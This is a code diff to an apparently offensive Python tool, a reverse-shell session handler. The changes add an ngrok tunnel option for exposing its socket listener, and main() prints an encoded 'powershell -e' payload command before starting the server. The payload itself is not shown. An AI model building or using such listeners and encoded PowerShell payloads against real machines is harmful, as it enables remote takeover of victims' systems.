@@ -25,8 +25,9 @@ init(autoreset=True)
 # -------------- USING PARSER LIBRARY --------------
 parser = argparse.ArgumentParser(description="Why so serious?")
 parser.add_argument('-l', '-local', type=str, required=True, help='Local Machine')
-parser.add_argument('-p', '-port', type=int, help='On What Port To Connect')
-parser.add_argument('-r', '-raw', choices=["raw"], required=False, help="Raw Output")
+parser.add_argument('-p', '-port', type=int, help='On What Port To Connect locally')
+parser.add_argument('-r', '-raw', choices=["raw"], required=False, help="Raw Output [ Clean text ]")
+parser.add_argument('-n', '-ngr', choices=["ngrok"], required=False, help="Ngrok tunnel")
 args = parser.parse_args()
 
 if not args.p:
@@ -295,11 +296,17 @@ def B64(FTD):
 
 # Maintain sessions using socket.
 def start_server():
-    # Sessions to be stored and save when connection made.
+    # Sessions to be stored and save when connections are made.
     sessions = {}
     # Listen to all interfaces
     hostname = '0.0.0.0'
-    port = args.p
+    if not args.n:
+        # Local port [ not forwarding ]
+        port = args.p
+    else:
+        #use ngrok and prompt user to select a local port to listen when requests are coming
+        port = int(input(f"[?] {l_cyan}On which PORT to listen:{Normal} "))
+    # Continue normally
     max_sessions = 5
 
     server_socket = socket.socket()
@@ -431,7 +438,6 @@ def main():
         print(f"powershell -e {base_bytes_out.decode('utf-8')}")
     time.sleep(0.5)
     start_server()
-
 
 if __name__ == '__main__':
     main()
